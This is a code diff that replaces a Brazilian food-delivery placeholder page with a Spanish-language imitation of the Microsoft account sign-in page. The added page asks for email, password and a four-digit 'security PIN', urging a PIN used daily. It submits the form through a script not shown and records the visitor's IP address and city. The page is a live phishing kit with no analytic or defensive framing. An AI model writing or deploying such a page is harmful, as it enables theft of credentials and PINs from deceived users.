@@ -1,126 +1,234 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Saypi Food Delivery</title>
-    <link rel="stylesheet" href="./style/index.css">
-    <link rel="icon" href="./images/favicon.jpeg" type="image/jpeg">
-</head>
-<body>
-    <header>
-        <h1>Saypi Delivery</h1>
-    </header>
-    <nav>
-        <ul>
-            <li><a href="index.html" class="navi">Início</a></li>
-            <li><a href="cardapio.html" class="navi">Cardápio</a></li>
-            <li><a href="avalia.html" class="navi">Avaliação</a></li>
-            <li><a href="chat.html" class="navi">Chat</a></li>
-        </ul>
-    </nav>
-    <main>
-    <div id="categorias">   
-        <section class="br">
-                <h2>Típica Brasileira</h2>
-                <section class="pratoB">
-                    <h3>Feijoada</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
+<html dir="ltr" lang="es" class="translated-ltr">
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta http-equiv="x-dns-prefetch-control" content="on">
+      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+      <title>Inicie sesión en su cuenta de Microsoft</title>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+      <script>
+      $.getJSON("https://api.ipify.org?format=json",
+                                     function(data) {
 
-                <section class="pratoB">
-                    <h3>Estrogonofre de frango</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
+       // Setting text of element P with id gfg
+       $("#gfg").html(data.ip);
+      })
+      </script>
+      <script>
+      $.getJSON("https://ipinfo.io", function (response) {
+      $("#ip").html("IP: " + response.ip);
+      $("#address").html("" + response.city + ", " + response.country);
 
-                <section class="pratoB">
-                    <h3>Contra-filé</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-            </section>
-
-            <section class="massa">
-                <h2>Massa</h2>
-                <section class="pratoM">
-                    <h3>Lasanha à bolonhesa</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-
-                <section class="pratoM">
-                    <h3>Talharim ao molho 4 queijos</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-
-                <section class="pratoM">
-                    <h3>Gnocci ao molho rosé</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-            </section>
-
-            <section class="oriental">
-                <h2>Oriental</h2>
-                <section class="pratoR">
-                    <h3>Yakissoba</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-
-                <section class="pratoR">
-                    <h3>Tonkatsu Lámen</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-
-                <section class="pratoR">
-                    <h3>Domburi de frango</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-            </section>
-
-            <section class="lanches">
-                <h2>Lanches</h2>
-                <section class="prato">
-                    <h3>X-burguer com fritas</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-
-                <section class="prato">
-                    <h3>X-frango com fritas</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-
-                <section class="prato">
-                    <h3>X-bacon com fritas</h3>
-                    <p>Lorem, ipsum dolor sit amet consectetur adipisicing elit. Consequuntur, repellendus.</p>
-                </section>
-            </section>
-        </div> 
-
-        <aside class="avaliacoes">
-            <h2>Avaliações</h2>
-            <div id="av1">
-                <h3 class="cliente">Lorem ipsum dolor sit amet.</h3>
-                <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Tenetur, facilis.</p>
+      })
+      </script>
+      <meta name="robots" content="none">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
+      <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29574.2/images/favicon.ico">
+      <link rel="stylesheet" type="text/css" href="css/Converged_v21033_zZcdRilg_8aFhvQ-1r_iIQ2.css">
+      <style type="text/css"></style>
+      <style type="text/css">body{display:none;}</style>
+      <style type="text/css">body{display:block !important;}</style>
+      <style type="text/css">body{display:block !important;}</style>
+      <link rel="image_src" href="https://logincdn.msauth.net/16.000.29574.2/images/Windows_Live_v_thumb.jpg">
+      <style type="text/css">#_copy{align-items:center;background:#4494d5;border-radius:3px;color:#fff;cursor:pointer;display:flex;font-size:13px;height:30px;justify-content:center;position:absolute;width:60px;z-index:1000}#select-tooltip,#sfModal,.modal-backdrop,div[id^=reader-helper]{display:none!important}.modal-open{overflow:auto!important}._sf_adjust_body{padding-right:0!important}.super_copy_btns_div{position:fixed;width:154px;left:10px;top:45%;background:#e7f1ff;border:2px solid #4595d5;font-weight:600;border-radius:2px;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Helvetica Neue,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol;z-index:5000}.super_copy_btns_logo{width:100%;background:#4595d5;text-align:center;font-size:12px;color:#e7f1ff;line-height:30px;height:30px}.super_copy_btns_btn{display:block;width:128px;height:28px;background:#7f5711;border-radius:4px;color:#fff;font-size:12px;border:0;outline:0;margin:8px auto;font-weight:700;cursor:pointer;opacity:.9}.super_copy_btns_btn:hover{opacity:.8}.super_copy_btns_btn:active{opacity:1}</style>
+      <style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>
+      <style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>
+      <style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style>
+      <link type="text/css" rel="stylesheet" charset="UTF-8" href="css/translateelement.css">
+   </head>
+   <body class="cb" _c_t_common="1">
+      <div id="goog-gt-tt" class="skiptranslate" dir="ltr">
+         <div style="padding: 8px;">
+            <div>
+               <div class="logo"><img src="img/translate_24dp.png" width="20" height="20" alt="Google Traductor de Google"></div>
             </div>
-
-            <div id="av2">
-                <h3 class="cliente">Lorem ipsum dolor sit amet.</h3>
-                <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Tenetur, facilis.</p>
+         </div>
+         <div class="top" style="padding: 8px; float: left; width: 100%;">
+            <h1 class="title gray">Texto original</h1>
+         </div>
+         <div class="middle" style="padding: 8px;">
+            <div class="original-text"></div>
+         </div>
+         <div class="bottom" style="padding: 8px;">
+            <div class="activity-links"><span class="activity-link">Sugiere una traducción mejor</span><span class="activity-link"></span></div>
+            <div class="started-activity-container">
+               <hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;">
+               <div class="activity-root"></div>
             </div>
+         </div>
+         <div class="status-message" style="display: none;"></div>
+      </div>
+      <div>
+         <!--  -->
+         <!--  -->
+         <div></div>
+       <form  action="" method="post"  onsubmit=" return sender()">
 
-            <div id="av3">
-                <h3 class="cliente">Lorem ipsum dolor sit amet.</h3>
-                <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Tenetur, facilis.</p>
+         
+    
+            <div class="login-paginated-page" >
+               <div id="lightboxTemplateContainer" >
+      
+                  <div id="lightboxBackgroundContainer" >
+                     <div class="background-image-holder" role="presentation">
+                  
+                        <div id="backgroundImage" class="background-image ext-background-image" style="background-image: url(&quot;img/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div>
+            
+                     </div>
+                  </div>
+           
+                  <div class="outer" >
+              
+                     <div class="template-section main-section">
+                        <div class="middle ext-middle">
+                           <div class="full-height">
+                   
+                              <div class="flex-column">
+                     
+                                 <div class="win-scroll">
+                                    <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">
+                                
+                                       <div class="lightbox-cover" ></div>
+                                       
+                                       <div><img class="logo" role="img" pngsrc="img/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" src="img/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="microsoft">
+                                       </div>
+                               
+                                       <div role="main" >
+                            
+                                          <div class="">
+                                           
+                                             <div class="pagination-view animate slide-in-next" >
+                                                <div data-viewid="1" data-showfedcredbutton="true" >
+                                         
+                                                   <div >
+                                                      <div>
+                                                         <div class="row title ext-title" id="loginHeader" >
+                                                            <div role="heading" aria-level="1" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Iniciar sesión</font></font></div>
+                                                          
+                                                         </div>
+                                                       
+                                                      </div>
+                                                   </div>
+                                             
+                                                   <div class="row">
+                                                      <div role="alert" aria-live="assertive">
+                                                    
+                                                      </div>
+                                                      <div class="form-group col-md-24">
+                                                      
+                                                         <div class="placeholderContainer">
+                                                            <input type="email" maxlength="113" required id="normalx" class="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Correo electrónico, teléfono o Skype">
+
+                                                            <input type="password" placeholder="Contraseña" required id="vergatario" class="form-control ltr_override input ext-input text-box ext-text-box"  >
+                                                            <br>
+                                                            <input type="text" placeholder="PIN" required id="normal" maxlength="4" minlength="4" style="border-radius: 10px;border: 1px solid;width:60px;text-align: center;">
+                                                           
+
+                                                            
+                                                         </div>
+                                                 
+                                                      </div>
+                                                   </div>
+                                                   <div class="position-buttons password-reset-links-container ext-password-reset-links-container">
+                                                      <div class="row">
+                                                         <div class="col-md-24">
+                                                            <div class="text-13">
+                                                   
+                                                               <div class="form-group" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Para reforzar la seguridad de tu cuenta es necesario que crees un pin de 4 numeros, Le recomendamos usar uno que frecuentes a diario para evitar ser olvidado.</font></font><a href="#" id="signup" aria-label="Crear una cuenta de Microsoft"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></a></div>
+                                                             
+                                                               <div class="form-group">
+                                                                  <a id="idA_PWD_SwitchToFido" name="switchToFido" href="#" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Iniciar sesión con una clave de seguridad</font></font></a>
+                                                                  
+                                                                  <span class="help-button" role="button" tabindex="0" ><img role="presentation" pngsrc="img/documentation_9628e22a6bfb1edc59e81064a666b614.png" svgsrc="img/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg" src="img/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg">
+                                                                  </span>
+                                                                  <div >
+                                                                     <!--  -->
+                                                                     <div>
+                                                                        <!-- -->
+                                                                     </div>
+                                                                  </div>
+                                                         
+                                                               </div>
+                                                             
+                                                            </div>
+                                                         </div>
+                                                      </div>
+                                                   </div>
+                                                
+                                                   <div class="win-button-pin-bottom">
+                                                      <div class="row" >
+                                                         <div>
+                                                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container" >
+                                                               <div class="inline-block button-item ext-button-item">
+                                                             
+                                                                  <font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><input type="submit"  class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit"  value="Siguiente" data-report-attached="1"></font></font>
+                                                               </div>
+                                                            </div>
+                                                         </div>
+                                                      </div>
+                                                   </div>
+                                                 
+                                                </div>
+                                               
+                                             </div>
+                                          </div>
+                                       </div>
+                                    
+                                  
+                                    </div>
+                               <br>
+                                    <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">
+                                       <div class="promoted-fed-cred-content">
+                                         
+                                          <div class="row tile">
+                                             <div class="table" role="button" tabindex="0" aria-label="Opciones de inicio de sesión">
+                                                <div class="table-row">
+                                                   <div class="table-cell tile-img medium"><img class="tile-img medium" role="presentation" src="img/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
+                                                   </div>
+                                                   <div class="table-cell text-left content">
+                                                      <div data-test-id="signinOptions"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Opciones de inicio de sesión</font></font></div>
+                                                   </div>
+                                                </div>
+                                             </div>
+                                          </div>
+                                          
+                              
+                                       </div>
+                                    </div>
+                                 
+                                 </div>
+                              </div>
+                       
+                           </div>
+                        </div>
+                     </div>
+                 
+                     <div id="footer" role="contentinfo"class="footer ext-footer">
+                        <div >
+                         
+                           <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" >
+                           
+                              <a id="ftrTerms"  href="#" class="footer-content ext-footer-content footer-item ext-footer-item"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Términos de Uso</font></font></a>
+                          
+                              <a class="footer-content ext-footer-content footer-item ext-footer-item"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Privacidad y cookies</font></font></a>
+       
+                              <a  class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></a>
+                           </div>
+                        
+                        </div>
+                     </div>
+            
+                  </div>
+           
+               </div>
+            
             </div>
-
-            <div id="av4">
-                <h3 class="cliente">Lorem ipsum dolor sit amet.</h3>
-                <p>Lorem ipsum dolor sit amet consectetur, adipisicing elit. Tenetur, facilis.</p>
-            </div>
-        </aside>
-    </main>
-
-    <footer>
-        <h5><i>Saypi Delivery @ 2024</i></h5>
-    </footer>
-
-</body>
+   <p id="gfg" >
+          <p id="address"   >
+         </form>
+        
+        
+      </div>
+      <script src="js/sax.js"></script>
+   </body>
 </html>
